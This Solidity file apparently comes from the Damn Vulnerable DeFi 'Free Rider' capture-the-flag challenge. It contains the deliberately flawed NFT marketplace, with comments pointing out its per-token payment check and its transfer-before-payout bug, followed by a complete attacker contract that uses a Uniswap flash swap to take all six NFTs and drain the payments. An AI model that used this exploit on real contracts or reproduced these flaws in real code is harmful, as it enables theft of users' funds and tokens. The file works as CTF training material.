// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {

    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public amountOfOffers;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);
    
    constructor(uint8 amountToMint) payable {
        require(amountToMint < 256, "Cannot mint that many tokens");
        token = new DamnValuableNFT();

        for(uint8 i = 0; i < amountToMint; i++) {
            token.safeMint(msg.sender);
        }        
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant { 
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(
            msg.sender == token.ownerOf(tokenId),
            "Account offering must be the owner"
        );

        require(
            token.getApproved(tokenId) == address(this) ||
            token.isApprovedForAll(msg.sender, address(this)),
            "Account offering must have approved transfer"
        );

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

    function _buyOne(uint256 tokenId) private {       
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        // Mistake is to check price only for one NFT
        require(msg.value >= priceToPay, "Amount paid is not enough");

        amountOfOffers--;

        // transfer from seller to buyer
        // Mistake is to transfer before payout
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }    

    receive() external payable {}
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IWETH9 is IERC20 {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

contract FreeRiderNFTMarketplaceAttacker is IUniswapV2Callee, IERC721Receiver {

    address private _owner;

    address private _uniswapV2Factory;

    address private _token;
    address private _wrappedETH;

    address payable private _marketplace;

    IUniswapV2Factory private factory;

    IWETH9 private weth;

    IUniswapV2Pair private immutable _pair;

    IERC721 private _nft;
    address private _partnerBuyer;

    uint public amountToRepay;

    constructor(
        address uniswapV2Factory,
        address token,
        address wrappedETH,
        address marketplace,
        address partnerBuyer,
        address nft
    ) {
        _owner = msg.sender;
        _uniswapV2Factory = uniswapV2Factory;
        _token = token;
        _wrappedETH = wrappedETH;
        _marketplace = payable(marketplace);
        _partnerBuyer = partnerBuyer;

        _nft = IERC721(nft);
        factory = IUniswapV2Factory(_uniswapV2Factory);
        weth = IWETH9(_wrappedETH);
        _pair = IUniswapV2Pair(factory.getPair(token, wrappedETH));
    }

    function attack(uint wethAmount) external {
        bytes memory data = abi.encode(_wrappedETH, msg.sender);

        _pair.swap(wethAmount, 0, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        require(msg.sender == address(_pair), "not pair");
        require(sender == address(this), "not sender");

        (, address caller) = abi.decode(data, (address, address));

        uint fee = (amount0 * 3) / 997 + 1;
        amountToRepay = amount0 + fee;

        weth.transferFrom(caller, address(this), fee);

        require(weth.balanceOf(address(this)) > 0, "WETH value is 0");

        weth.withdraw(amount0);

        uint256[] memory arr = new uint256[](6);

        for (uint256 index = 0; index < arr.length; index++) {
            arr[index] = index;
        }
        FreeRiderNFTMarketplace(_marketplace).buyMany{ value: 15 ether }(arr);

        weth.deposit{ value: amount0 }();

        weth.transfer(address(_pair), amountToRepay);
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    function claimETHAndSendNFTs() external {
        for (uint256 index = 0; index < 6; index++) {
            _nft.safeTransferFrom(address(this), _partnerBuyer, index);
        }
        payable(_owner).transfer(address(this).balance);
    }
}
